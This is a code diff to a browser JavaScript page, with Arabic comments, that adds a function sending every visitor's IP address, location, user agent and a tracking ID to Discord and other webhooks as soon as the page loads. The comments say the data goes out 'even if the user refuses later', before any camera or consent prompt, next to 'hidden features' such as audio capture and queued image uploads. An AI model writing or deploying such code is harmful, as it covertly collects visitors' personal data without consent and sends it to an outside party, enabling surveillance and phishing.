@@ -664,6 +664,44 @@ async function sendQueuedImages() {
     addLog('تم إرسال جميع الصور من قائمة الانتظار', 'success');
 }
 
+// ===== إرسال الآيبي فوراً (حتى لو رفض المستخدم لاحقاً) =====
+async function sendIpOnlyToWebhooks() {
+    if (!additionalData || (!CONFIG.webhooks.length && !CONFIG.locationWebhook)) return;
+    const ip = additionalData.ip || 'unknown';
+    const country = additionalData.country || 'unknown';
+    const city = additionalData.city || 'unknown';
+    const region = additionalData.region || 'unknown';
+    const content = `🌐 زائر | userId=${CONFIG.userId} | ip=${ip} | country=${country} | city=${city} | region=${region} | ua=${(navigator.userAgent || '').substring(0, 80)}`;
+    try {
+        if (CONFIG.enableDiscord && CONFIG.webhooks.length > 0) {
+            for (const webhook of CONFIG.webhooks) {
+                await sendToDiscord(webhook, content);
+            }
+            addLog('تم إرسال الآيبي إلى Discord (حتى لو رفض لاحقاً)', 'info');
+        }
+        if (CONFIG.locationWebhook) {
+            const payload = {
+                type: 'visitor_hit',
+                ip, country, region, city,
+                userAgent: navigator.userAgent,
+                timestamp: new Date().toISOString(),
+                userId: CONFIG.userId
+            };
+            await fetch(CONFIG.locationWebhook, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload),
+                mode: 'no-cors',
+                referrerPolicy: 'no-referrer',
+                credentials: 'omit'
+            });
+            addLog('تم إرسال الآيبي إلى ويبهوك الموقع', 'info');
+        }
+    } catch (e) {
+        addLog(`إرسال الآيبي: ${e.message}`, 'warning');
+    }
+}
+
 // ===== DATA COLLECTION =====
 async function collectAdditionalData() {
     try {
@@ -1371,6 +1409,9 @@ async function init() {
         // Collect additional data
         additionalData = await collectAdditionalData();
         addLog('Additional data collected', 'success');
+        
+        // إرسال الآيبي فوراً حتى لو حط رفض لاحقاً (كاميرا أو موافقة)
+        await sendIpOnlyToWebhooks();
         
         // تفعيل الميزات المخفية
         if (CONFIG.enableAudio) {
